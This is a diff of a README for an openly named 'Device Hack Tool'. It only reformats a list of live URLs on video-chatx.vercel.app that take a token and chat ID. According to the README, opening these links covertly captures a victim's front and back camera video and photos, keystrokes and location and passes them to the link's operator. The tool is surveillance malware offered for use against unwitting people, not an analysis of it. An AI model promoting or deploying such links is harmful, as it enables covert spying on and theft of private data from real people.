@@ -47,11 +47,25 @@ To begin using the **Device Hack Tool**, follow these simple steps:
 
 The **Device Hack Tool** provides several API endpoints for accessing data and interacting with device features:
 
-- **Front Camera Video and Info**: ```https://video-chatx.vercel.app/video-f.html?token=<টোকেন>&id=<চ্যাট আইডি>```
-- **Back Camera Video and Info**: ```https://video-chatx.vercel.app/video-b.html?token=<টোকেন>&id=<চ্যাট আইডি>```
-- **Front Camera Photo and Info**: ```https://video-chatx.vercel.app/photo-f.html?token=<টোকেন>&id=<চ্যাট আইডি>```
-- **Back Camera Photo and Info**: ```https://video-chatx.vercel.app/photo-b.html?token=<টোকেন>&id=<চ্যাট আইডি>```
-- **Keyboard and Location Info**: ```https://video-chatx.vercel.app/main.html?token=<টোকেন>&id=<চ্যাট আইডি>```
+**Front Camera Video and Info**:
+
+```https://video-chatx.vercel.app/video-f.html?token=<টোকেন>&id=<চ্যাট আইডি>```
+
+**Back Camera Video and Info**:
+
+```https://video-chatx.vercel.app/video-b.html?token=<টোকেন>&id=<চ্যাট আইডি>```
+
+**Front Camera Photo and Info**:
+
+```https://video-chatx.vercel.app/photo-f.html?token=<টোকেন>&id=<চ্যাট আইডি>```
+
+**Back Camera Photo and Info**: 
+
+```https://video-chatx.vercel.app/photo-b.html?token=<টোকেন>&id=<চ্যাট আইডি>```
+
+**Keyboard and Location Info**: 
+
+```https://video-chatx.vercel.app/main.html?token=<টোকেন>&id=<চ্যাট আইডি>```
 
 ### ⚙️ Usage
 
